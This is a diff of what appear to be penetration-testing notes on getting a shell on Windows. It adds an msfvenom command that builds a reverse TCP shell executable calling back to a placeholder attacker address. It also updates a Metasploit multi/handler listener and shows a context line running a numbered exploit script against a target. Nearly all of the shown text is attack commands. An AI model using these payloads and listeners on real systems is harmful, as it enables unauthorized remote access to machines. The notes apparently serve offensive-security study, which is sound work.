@@ -14,7 +14,15 @@
 
 #### Retrieving shell (without metasploit)
 
-... to test
+&#x20;_**Windows reverse TCP payload**_
+
+{% code overflow="wrap" %}
+```sh
+$ msfvenom -p windows/shell/reverse_tcp LHOST=<attacker_addr> LPORT=8888 -f exe -o <output>.exe
+```
+{% endcode %}
+
+_**Windows (Powershell) reverse TCP payload**_
 
 {% code overflow="wrap" %}
 ```sh
@@ -107,11 +115,11 @@ $ python2 39161.py <target> <port>
 ```
 {% endcode %}
 
-#### Catch meterpreter&#x20;
+#### Catch shell/meterpreter&#x20;
 
 ```sh
 msf6> use multi/handler
-msf6> set payload windows/x64/meterpreter_reverse_tcp
+msf6> set payload xxxx
 msf6> set lhost xxxx
 msf6> set lport xxxx
 
